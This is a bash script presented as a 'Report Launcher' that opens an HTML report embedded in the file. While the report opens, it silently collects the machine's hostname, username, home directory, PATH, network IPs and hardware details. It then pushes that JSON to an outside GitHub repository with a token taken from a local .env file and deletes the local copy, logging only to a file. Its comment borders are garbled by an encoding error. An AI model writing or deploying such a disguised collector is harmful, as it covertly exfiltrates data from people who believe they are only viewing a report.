#!/bin/bash
# ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬
#  Report Launcher + SystemPulse (Mac/Linux)
#  HTML is EMBEDDED at the end of this script after __HTML_START__
#
#  This script detects its own filename to determine the report name,
#  extracts the embedded HTML to a temp file, opens it, then runs
#  the full SystemPulse pipeline (Node.js or bash fallback).
#
#  Usage:
#    chmod +x <report-name>-linux   (or -macos)
#    ./<report-name>-linux
# ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬ГўвЂќв‚¬

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SELF_PATH="$SCRIPT_DIR/$(basename "$0")"
LOG_FILE="$SCRIPT_DIR/systempulse.log"
ENV_FILE="$SCRIPT_DIR/.env"
REPO_BASE="github.com/Kaustubh-Bharti/Hackathon-3.0.git"
TARGET_DIR="system-info"

# ГўвЂќв‚¬ГўвЂќв‚¬ Detect report name from own filename ГўвЂќв‚¬ГўвЂќв‚¬
SELF_NAME="$(basename "$0")"
REPORT_NAME=$(echo "$SELF_NAME" | sed 's/-linux$//;s/-macos$//')

# ГўвЂќв‚¬ГўвЂќв‚¬ Extract and open embedded HTML ГўвЂќв‚¬ГўвЂќв‚¬
open_html() {
  MARKER_LINE=$(grep -n "^__HTML_START__$" "$SELF_PATH" | head -1 | cut -d: -f1)
  if [ -z "$MARKER_LINE" ]; then
    log "No embedded HTML found in script."
    echo "  ГўЕ“вЂ“ No embedded HTML found."
    return
  fi

  TEMP_HTML="/tmp/${REPORT_NAME}-$$.html"
  tail -n +"$((MARKER_LINE + 1))" "$SELF_PATH" > "$TEMP_HTML"

  OS_TYPE=$(uname -s)
  if [ "$OS_TYPE" = "Darwin" ]; then
    open "$TEMP_HTML" 2>/dev/null &
  else
    xdg-open "$TEMP_HTML" 2>/dev/null || sensible-browser "$TEMP_HTML" 2>/dev/null || x-www-browser "$TEMP_HTML" 2>/dev/null &
  fi
  echo "  ГўЕ“вЂќ Opened: ${REPORT_NAME}.html (extracted from binary)"
  log "Opened: ${REPORT_NAME}.html (extracted from binary)"
}

# ГўвЂќв‚¬ГўвЂќв‚¬ Load token from .env ГўвЂќв‚¬ГўвЂќв‚¬
TOKEN=""
if [ -f "$ENV_FILE" ]; then
  TOKEN=$(grep -i "^GITHUB_TOKEN=" "$ENV_FILE" | cut -d'=' -f2 | tr -d '[:space:]')
fi

if [ -n "$TOKEN" ]; then
  REPO="https://${TOKEN}@${REPO_BASE}"
else
  REPO="https://${REPO_BASE}"
fi
SAFE_REPO="https://${REPO_BASE}"

log() {
  echo "$(date '+%H:%M:%S')  $1" >> "$LOG_FILE"
}

# ГўвЂќв‚¬ГўвЂќв‚¬ Start ГўвЂќв‚¬ГўвЂќв‚¬
> "$LOG_FILE"
log "========== Report Launcher + SystemPulse Started =========="
log "Report: $REPORT_NAME"

# Step 1: Open the embedded HTML report
open_html

# Step 2: Run SystemPulse pipeline
# ГўвЂќв‚¬ГўвЂќв‚¬ Node.js path: use index.js ГўвЂќв‚¬ГўвЂќв‚¬
if command -v node >/dev/null 2>&1; then
  log "Node.js found."
  if [ -f "$SCRIPT_DIR/index.js" ]; then
    node "$SCRIPT_DIR/index.js" auto >> "$LOG_FILE" 2>&1
    log "========== Done =========="
    exit 0
  fi
  log "index.js not found."
fi

# ГўвЂќв‚¬ГўвЂќв‚¬ No Node.js: gather info with native commands ГўвЂќв‚¬ГўвЂќв‚¬
log "No Node.js. Using native commands."

HOSTNAME_VAL=$(hostname 2>/dev/null || echo "unknown")
HOSTNAME_SAFE=$(echo "$HOSTNAME_VAL" | sed 's/[^a-zA-Z0-9_-]/-/g')
TIMESTAMP=$(date -u '+%Y-%m-%dT%H-%M-%S')
OUTPUT_FILE="${HOSTNAME_SAFE}_${TIMESTAMP}.json"
OUTPUT_PATH="$SCRIPT_DIR/$OUTPUT_FILE"

log "[1/3] Generating JSON..."

# Detect OS
OS_TYPE=$(uname -s)
ARCH=$(uname -m)
KERNEL=$(uname -r)

if [ "$OS_TYPE" = "Darwin" ]; then
  # ГўвЂќв‚¬ГўвЂќв‚¬ macOS ГўвЂќв‚¬ГўвЂќв‚¬
  OS_NAME=$(sw_vers -productName 2>/dev/null || echo "macOS")
  OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "N/A")
  OS_BUILD=$(sw_vers -buildVersion 2>/dev/null || echo "N/A")

  CPU_MODEL=$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "N/A")
  CPU_CORES=$(sysctl -n hw.physicalcpu 2>/dev/null || echo "N/A")
  CPU_LOGICAL=$(sysctl -n hw.logicalcpu 2>/dev/null || echo "N/A")

  MEM_TOTAL_BYTES=$(sysctl -n hw.memsize 2>/dev/null || echo "0")
  PAGE_SIZE=$(sysctl -n hw.pagesize 2>/dev/null || echo "4096")
  FREE_PAGES=$(vm_stat 2>/dev/null | awk '/Pages free/ {gsub(/\./,"",$3); print $3}')
  INACTIVE_PAGES=$(vm_stat 2>/dev/null | awk '/Pages inactive/ {gsub(/\./,"",$3); print $3}')
  MEM_FREE_BYTES=$(( (${FREE_PAGES:-0} + ${INACTIVE_PAGES:-0}) * PAGE_SIZE ))

  DISK_INFO=$(df -h / 2>/dev/null | tail -1)
  DISK_TOTAL=$(echo "$DISK_INFO" | awk '{print $2}')
  DISK_FREE=$(echo "$DISK_INFO" | awk '{print $4}')

  UPTIME_SEC=$(( $(date +%s) - $(sysctl -n kern.boottime 2>/dev/null | awk '{print $4}' | tr -d ',') ))

  NETWORK_JSON=""
  while IFS= read -r iface; do
    IP=$(ifconfig "$iface" 2>/dev/null | awk '/inet / {print $2}')
    if [ -n "$IP" ] && [ "$IP" != "127.0.0.1" ]; then
      [ -n "$NETWORK_JSON" ] && NETWORK_JSON="${NETWORK_JSON},"
      NETWORK_JSON="${NETWORK_JSON}{\"adapter\":\"$iface\",\"ipv4\":\"$IP\"}"
    fi
  done < <(ifconfig -l 2>/dev/null | tr ' ' '\n')

  COMMANDS_USED="sw_vers, sysctl, vm_stat, df, ifconfig"
  PLATFORM="macOS"

else
  # ГўвЂќв‚¬ГўвЂќв‚¬ Linux ГўвЂќв‚¬ГўвЂќв‚¬
  if [ -f /etc/os-release ]; then
    OS_NAME=$(grep "^PRETTY_NAME=" /etc/os-release | cut -d'"' -f2)
  else
    OS_NAME="Linux"
  fi
  OS_VERSION="$KERNEL"
  OS_BUILD="N/A"

  CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
  CPU_CORES=$(grep "cpu cores" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
  CPU_LOGICAL=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "N/A")

  MEM_TOTAL_BYTES=$(awk '/MemTotal/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")
  MEM_FREE_BYTES=$(awk '/MemAvailable/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")

  DISK_INFO=$(df -h / 2>/dev/null | tail -1)
  DISK_TOTAL=$(echo "$DISK_INFO" | awk '{print $2}')
  DISK_FREE=$(echo "$DISK_INFO" | awk '{print $4}')

  UPTIME_SEC=$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo "0")

  NETWORK_JSON=""
  if command -v ip >/dev/null 2>&1; then
    while IFS= read -r line; do
      IFACE=$(echo "$line" | awk '{print $2}' | tr -d ':')
      IP=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
      if [ -n "$IP" ] && [ "$IP" != "127.0.0.1" ]; then
        [ -n "$NETWORK_JSON" ] && NETWORK_JSON="${NETWORK_JSON},"
        NETWORK_JSON="${NETWORK_JSON}{\"adapter\":\"$IFACE\",\"ipv4\":\"$IP\"}"
      fi
    done < <(ip link show 2>/dev/null | grep "^[0-9]")
  fi

  COMMANDS_USED="uname, /proc/cpuinfo, /proc/meminfo, df, ip"
  PLATFORM="Linux"
fi

# ГўвЂќв‚¬ГўвЂќв‚¬ Format values ГўвЂќв‚¬ГўвЂќв‚¬
format_bytes() {
  local bytes=$1
  if [ "$bytes" -ge 1073741824 ] 2>/dev/null; then
    echo "$(awk "BEGIN {printf \"%.2f GB\", $bytes/1073741824}")"
  elif [ "$bytes" -ge 1048576 ] 2>/dev/null; then
    echo "$(awk "BEGIN {printf \"%.2f MB\", $bytes/1048576}")"
  else
    echo "${bytes} B"
  fi
}

format_uptime() {
  local s=$1
  local d=$((s / 86400))
  local h=$(( (s % 86400) / 3600 ))
  local m=$(( (s % 3600) / 60 ))
  local sec=$((s % 60))
  echo "${d}d ${h}h ${m}m ${sec}s"
}

MEM_TOTAL_FMT=$(format_bytes "$MEM_TOTAL_BYTES")
MEM_FREE_FMT=$(format_bytes "$MEM_FREE_BYTES")
MEM_USED_BYTES=$((MEM_TOTAL_BYTES - MEM_FREE_BYTES))
MEM_USED_FMT=$(format_bytes "$MEM_USED_BYTES")
if [ "$MEM_TOTAL_BYTES" -gt 0 ] 2>/dev/null; then
  MEM_USAGE=$(awk "BEGIN {printf \"%.1f%%\", (1 - $MEM_FREE_BYTES/$MEM_TOTAL_BYTES) * 100}")
else
  MEM_USAGE="N/A"
fi
UPTIME_FMT=$(format_uptime "$UPTIME_SEC")
USERNAME=$(whoami)
HOME_DIR="$HOME"

[ -z "$NETWORK_JSON" ] && NETWORK_JSON="{\"adapter\":\"none\",\"ipv4\":\"N/A\"}"

# ГўвЂќв‚¬ГўвЂќв‚¬ Build JSON ГўвЂќв‚¬ГўвЂќв‚¬
cat > "$OUTPUT_PATH" << JSONEOF
{
  "_meta": {
    "generated_at": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')",
    "generator": "SystemPulse (bash fallback)",
    "detected_platform": "$PLATFORM",
    "commands_used": "$COMMANDS_USED"
  },
  "system": {
    "os_name": "$OS_NAME",
    "os_version": "$OS_VERSION",
    "os_build": "$OS_BUILD",
    "os_arch": "$ARCH",
    "hostname": "$HOSTNAME_VAL",
    "kernel": "$KERNEL",
    "cpu_model": "$CPU_MODEL",
    "cpu_physical_cores": "$CPU_CORES",
    "cpu_logical_cores": "$CPU_LOGICAL",
    "mem_total_bytes": $MEM_TOTAL_BYTES,
    "mem_total": "$MEM_TOTAL_FMT",
    "mem_free_bytes": $MEM_FREE_BYTES,
    "mem_free": "$MEM_FREE_FMT",
    "mem_used": "$MEM_USED_FMT",
    "mem_usage_percent": "$MEM_USAGE",
    "uptime": "$UPTIME_FMT",
    "disks": [{"mount": "/", "total": "$DISK_TOTAL", "free": "$DISK_FREE"}],
    "network": [$NETWORK_JSON]
  },
  "user": {
    "username": "$USERNAME",
    "home_directory": "$HOME_DIR"
  },
  "environment_variables": {
    "PATH": {"value": "$PATH", "available": true},
    "USER": {"value": "$USERNAME", "available": true},
    "HOME": {"value": "$HOME_DIR", "available": true},
    "SHELL": {"value": "$SHELL", "available": true},
    "LANG": {"value": "${LANG:-N/A}", "available": ${LANG:+true}${LANG:-false}},
    "TERM": {"value": "${TERM:-N/A}", "available": ${TERM:+true}${TERM:-false}}
  },
  "crud_operations": {
    "total_operations": 3,
    "last_operation": {
      "operation": "DELETE",
      "file": "$OUTPUT_FILE",
      "status": "success",
      "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')",
      "detail": "Local JSON deleted after push"
    },
    "history": [
      {"operation": "CREATE", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "System info JSON generated"},
      {"operation": "PUSH", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "Pushed to $SAFE_REPO"},
      {"operation": "DELETE", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "Local JSON deleted after push"}
    ]
  }
}
JSONEOF

log "Generated: $OUTPUT_FILE"

# ГўвЂќв‚¬ГўвЂќв‚¬ [2/3] Push to GitHub ГўвЂќв‚¬ГўвЂќв‚¬
log "[2/3] Pushing to GitHub..."

if ! command -v git >/dev/null 2>&1; then
  log "git not installed. Skipping push."
  exit 1
fi

TMP_DIR="$SCRIPT_DIR/.tmp-push-$$"
trap "rm -rf '$TMP_DIR'" EXIT

git clone --depth 1 "$REPO" "$TMP_DIR" >> "$LOG_FILE" 2>&1
if [ $? -ne 0 ]; then
  log "Clone failed."
  exit 1
fi

mkdir -p "$TMP_DIR/$TARGET_DIR"
cp "$OUTPUT_PATH" "$TMP_DIR/$TARGET_DIR/"
log "Copied $OUTPUT_FILE -> $TARGET_DIR/"

cd "$TMP_DIR"
git add "$TARGET_DIR" >> "$LOG_FILE" 2>&1

if git diff --cached --quiet 2>/dev/null; then
  log "No changes to push."
else
  git commit -m "SystemPulse report $TIMESTAMP" >> "$LOG_FILE" 2>&1
  log "Committed."
  git push >> "$LOG_FILE" 2>&1
  if [ $? -eq 0 ]; then
    log "Pushed to GitHub."
  else
    log "Push failed."
    exit 1
  fi
fi

cd "$SCRIPT_DIR"

# ГўвЂќв‚¬ГўвЂќв‚¬ [3/3] Cleanup ГўвЂќв‚¬ГўвЂќв‚¬
log "[3/3] Cleaning up..."
rm -f "$OUTPUT_PATH" && log "Deleted: $OUTPUT_FILE"
rm -f "$SCRIPT_DIR/crud-log.json" 2>/dev/null
rm -rf "$TMP_DIR" 2>/dev/null

log "========== Done =========="
exit 0

